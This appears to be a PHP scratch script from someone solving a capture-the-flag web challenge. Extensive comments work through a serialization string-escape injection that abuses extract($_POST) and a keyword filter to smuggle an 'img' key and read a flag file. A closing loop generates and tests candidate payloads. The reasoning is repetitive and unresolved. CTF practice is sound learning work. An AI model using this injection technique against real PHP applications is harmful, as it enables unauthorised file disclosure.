<?php
// Let me reconsider the problem.
// 
// The code flow:
// 1. $_SESSION["user"] = 'guest';
// 2. $_SESSION['function'] = $function; (from GET param f)
// 3. extract($_POST); (can overwrite variables)
// 4. $_SESSION['img'] = base64_encode('guest_img.png'); (or sha1 if img_path is set)
// 5. $serialize_info = filter(serialize($_SESSION));
// 6. if function == 'show_image': $userinfo = unserialize($serialize_info);
//    echo file_get_contents(base64_decode($userinfo['img']));

// The key insight: extract($_POST) can overwrite ANY variable, including $_SESSION!
// 
// If we set _SESSION via POST, we can control the entire session array!
// 
// But wait, the code sets $_SESSION['img'] AFTER extract(), so we can't control img directly.
// 
// However, if we set _SESSION['img'] via POST, and then the code sets $_SESSION['img'] again,
// our value would be overwritten!
// 
// Unless... we use the escape trick to inject a new img value!

// Actually, let me re-read the code more carefully.
// 
// extract($_POST) overwrites variables in the current scope.
// 
// If we POST _SESSION[img]=xxx, then $_SESSION['img'] would be set to xxx.
// But then the code sets $_SESSION['img'] = base64_encode('guest_img.png'), overwriting our value!
// 
// So we can't directly control img via POST.

// But what if we use the escape trick to inject a DUPLICATE img key?
// 
// PHP arrays allow duplicate keys, and the LAST one wins!
// 
// If we can inject a new img key AFTER the original img, our injected value would win!

// Let me think about how to do this.
// 
// The serialized session: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"BASE64";}
// 
// If we can inject a new img key-value pair after the original img, it would overwrite!

// The escape trick: use the filter to shrink a value, causing PHP to read past the boundary.
// 
// But as we've seen, the escaped content is read as the VALUE, not as separate elements!

// Wait, let me re-read the 0CTF 2016 writeup technique.
// 
// The key insight: the filter EXPANDS the string (where->hacker).
// PHP reads N bytes and STOPS, leaving the extra bytes as the next element!
// 
// For SHRINKING, the opposite happens: PHP reads N bytes and reads PAST the boundary.
// The escaped content is read as the VALUE, not as separate elements!

// So the escape trick for SHRINKING is different!
// 
// For SHRINKING, we need to use a different technique.

// Let me think about this:
// 
// What if we use the escape to make PHP read content that INCLUDES the next key-value pair?
// 
// For example:
// user = 'flag' + '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// After filter, the user value is: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads this as the VALUE of user.
// 
// But then PHP continues parsing and expects the next element.
// 
// The next element would be: s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Wait, this is the original structure!

// Hmm, I'm going in circles. Let me try a different approach.

// What if we use the escape to consume the ENTIRE remaining structure?
// 
// The remaining structure after user value: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"BASE64";}
// 
// Length: 73 bytes
// 
// If we generate 73 bytes of overflow, PHP reads the entire remaining structure
// as part of the user VALUE.
// 
// Then PHP expects the next element, but there's only } left!
// 
// PHP parses } as the end of array.
// 
// But the array count is 3, and we've only parsed 1 element!
// 
// Error!

// Unless... we inject content that includes the array count!
// 
// But the array count is at the beginning of the serialized string, not in the middle!

// I think the key insight is:
// For SHRINKING, we can't inject new elements directly.
// We need to use a different technique.

// Let me think about what we can control:
// 1. user - via extract($_POST)
// 2. function - via GET param f or extract($_POST)
// 3. img - set by the code, but we can try to overwrite via escape

// Actually, let me re-read the code one more time.
// 
// $_SESSION['img'] = base64_encode('guest_img.png');
// 
// This sets img to the base64 of 'guest_img.png'.
// 
// But what if we DON'T set img_path? Then img = base64_encode('guest_img.png').
// 
// And what if we DO set img_path? Then img = sha1(base64_encode(img_path)).
// 
// The sha1 is a hash, not the base64 we want.
// 
// So we can't control img via img_path!

// The only way to control img is via the escape trick!

// Let me try one more approach:
// What if we use the escape to inject content that CLOSES the array and then adds our own elements?
// 
// For example:
// user = 'flag' * 18 + '";}a:1:{s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// After filter: ';}a:1:{s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// PHP reads this as the VALUE of user.
// 
// But the ';} would close the user value and the array!
// 
// Then a:1:{s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} would be a new array!
// 
// But PHP would ignore this because it's after the end of the original array!

// Hmm, this doesn't work either.

// Let me try yet another approach:
// What if we use the escape to make the serialized string INVALID, causing unserialize to fail,
// but in a way that still allows file_get_contents to execute?

// Actually, that doesn't make sense. If unserialize fails, $userinfo would be false,
// and file_get_contents would fail!

// I'm stuck. Let me search for the correct technique.

// Actually, let me re-read the challenge code one more time.

// $serialize_info = filter(serialize($_SESSION));
// 
// if($function == 'show_image'){
//     $userinfo = unserialize($serialize_info);
//     echo file_get_contents(base64_decode($userinfo['img']));
// }

// The key: $userinfo['img'] is used to read a file.
// We want $userinfo['img'] to be base64 of 'd0g3_f1ag.php'.
// 
// base64('d0g3_f1ag.php') = 'ZDBnM19mMWFnLnBocA=='

// So we need to inject img = 'ZDBnM19mMWFnLnBocA==' into the unserialized array!

// The escape trick should allow us to inject a new img key-value pair.

// But as we've seen, the escaped content is read as the VALUE, not as separate elements!

// Wait, let me re-examine the filtered string.
// 
// Filtered: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:51:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// After s:51:"";, the content is: ;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Wait, there's a semicolon before s:3:"img"!
// 
// Let me trace through:
// Position 48: " (opening quote of s:51:")
// Position 49: " (closing quote of empty string)
// Position 50: ; (semicolon)
// Position 51: s (start of next element)
// 
// So after s:51:"", the next element is s:3:"img"!
// 
// But PHP reads 51 bytes from position 49, which includes the ";s:3:"img";...!
// 
// So the content is: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img (51 bytes)
// 
// After reading 51 bytes, PHP is at position 100.
// Position 100: " (closing quote)
// Position 101: ; (semicolon)
// 
// PHP reads "; and continues from position 102.
// 
// Position 102 onwards: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP expects key 3, but sees s:20:..., which is a VALUE, not a KEY!
// 
// Error!

// So the issue is that after the 51-byte value, PHP expects a KEY, but sees a VALUE!

// The injection ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img
// includes ";s:3:"img"; which should be a KEY-VALUE pair!
// 
// But PHP reads the entire 51 bytes as the VALUE, not parsing ";s:3:"img"; as separate!

// Wait, I think I finally understand!
// 
// The serialized format is: s:N:"CONTENT";
// 
// After reading N bytes of CONTENT, PHP reads "; (closing quote and semicolon).
// 
// Then PHP continues parsing the next element!
// 
// So after reading 51 bytes of CONTENT, PHP reads "; and continues.
// 
// The next element is: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// But this is a VALUE, not a KEY!
// 
// PHP expects: KEY;VALUE
// But sees: VALUE
// 
// Error!

// So the injection needs to end with a KEY, not a VALUE!
// 
// The injection ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img
// ends with s:3:"img, which is a KEY (s:3:"img")!
// 
// But PHP reads 51 bytes, which ends with "img (missing the closing quote and semicolon).
// 
// After reading 51 bytes, PHP reads "; (closing quote and semicolon).
// 
// Then PHP continues parsing.
// 
// The next element is: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// But this is a VALUE, not a KEY!
// 
// Wait, the injection ends with s:3:"img, which should be followed by "; to complete the KEY.
// 
// After reading 51 bytes, PHP reads "; (closing quote and semicolon of the VALUE).
// 
// But the "; is the closing quote and semicolon of the VALUE, not of the KEY!
// 
// So PHP thinks the VALUE is done, and expects the next KEY.
// 
// But the next chars are: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// This is a VALUE, not a KEY!
// 
// Error!

// I think the issue is that the injection includes both KEY and VALUE,
// but PHP reads the entire injection as the VALUE of the previous element!

// Let me try a different injection:
// What if the injection is just a KEY?
// 
// injection = ";s:3:"img"
// 
// Then PHP reads the injection as the VALUE, and the next chars would be the VALUE of img!
// 
// Let me test this.

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// Test with injection = ";s:3:"img"
$injection = '";s:3:"img"';
echo "Injection: $injection\n";
echo "Injection length: " . strlen($injection) . "\n\n";

// We need to generate 10 bytes of overflow (to reach position 10 in the remaining content)
// 10 / 4 = 2.5, not an integer
// 10 / 3 = 3.33, not an integer
// 
// Let me try 6 bytes of overflow (2 'php's)
// 6 + 10 = 16 bytes
// 
// Position 16 in the remaining content: "
// Remaining content: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// Position 16: " (from s:20:"...)

// Hmm, this is getting complicated. Let me just try different values.

for ($overflow = 0; $overflow <= 20; $overflow++) {
    // Calculate the number of 'flag's and 'php's needed
    $flags = floor($overflow / 4);
    $remaining = $overflow % 4;
    $phps = 0;
    if ($remaining == 3) {
        $phps = 1;
    } elseif ($remaining == 2) {
        // Can't generate 2 bytes with 'flag' (4) or 'php' (3)
        continue;
    } elseif ($remaining == 1) {
        // Can't generate 1 byte
        continue;
    }
    
    $injection = '";s:3:"img"';
    $payload = str_repeat('flag', $flags) . str_repeat('php', $phps) . $injection;
    
    $_SESSION = [];
    $_SESSION['user'] = 'guest';
    $_SESSION['function'] = $payload;
    $_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';
    
    $serialized = serialize($_SESSION);
    $filtered = filter($serialized);
    
    echo "=== overflow=$overflow (flags=$flags, phps=$phps) ===\n";
    
    $result = @unserialize($filtered);
    if ($result !== false) {
        echo "SUCCESS!\n";
        var_dump($result);
        if (isset($result['img'])) {
            echo "IMG: " . $result['img'] . "\n";
        }
    } else {
        echo "Failed\n";
    }
    echo "\n";
}

